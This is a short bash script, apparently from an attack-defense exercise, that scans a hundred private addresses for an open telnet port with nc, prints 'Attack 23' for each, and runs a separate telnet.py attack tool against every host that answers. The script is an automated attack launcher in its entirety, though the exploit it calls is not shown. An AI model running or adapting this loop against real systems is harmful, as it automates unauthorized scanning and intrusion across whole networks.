#!/bin/bash

for i in `seq 101 200`
do
ip="172.20.$i.101"
echo "Attack 23 $ip..."
a=`nc -z -w1 $ip 23`
if [ "$?" == "0" ]
then 
./telnet.py -H $ip
fi
done
